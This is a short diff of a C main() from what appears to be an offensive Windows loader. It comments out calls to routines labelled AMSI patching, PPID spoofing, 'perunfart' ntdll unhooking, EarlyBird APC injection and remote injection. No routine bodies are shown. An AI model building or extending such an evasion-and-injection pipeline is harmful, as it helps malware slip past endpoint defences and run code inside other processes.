@@ -36,12 +36,12 @@ int main(int argc, char* argv[])
 
 	printf("/////////////////////////////////////////////// Patching AMSI //////////////////////////////////\n");
 	//amsiPatch();
-
+	//threadPool();not working:(
 	/// <summary>
 	/// if you wish to use ppid spoofing uncomment the ppid function below and comment CreateProcess function in the UNHOOKING part
 	/// </summary>
-	//printf("\n/////////////////////////////////////////////// PPID Spoofing //////////////////////////////////\n");
-	//pi = ppid(attributeSize, six);
+	/*printf("\n/////////////////////////////////////////////// PPID Spoofing //////////////////////////////////\n");
+	pi = ppid(attributeSize, six);*/
 	
 	printf("\n/////////////////////////////////////////////// UNHOOKING //////////////////////////////////\n");
 	/// Use this CreateProcess function if you don't want ppid spoofing
@@ -51,8 +51,9 @@ int main(int argc, char* argv[])
 	perunfart(pi.hProcess);
 
 	printf("\n/////////////////////////////////////////////// EarlyBird //////////////////////////////////\n");
-	earlybird(pi);
-	
+	//earlybird(pi);
+	//ntTestInject();
+	//RemoteInject();
 
 	return 0;
 }
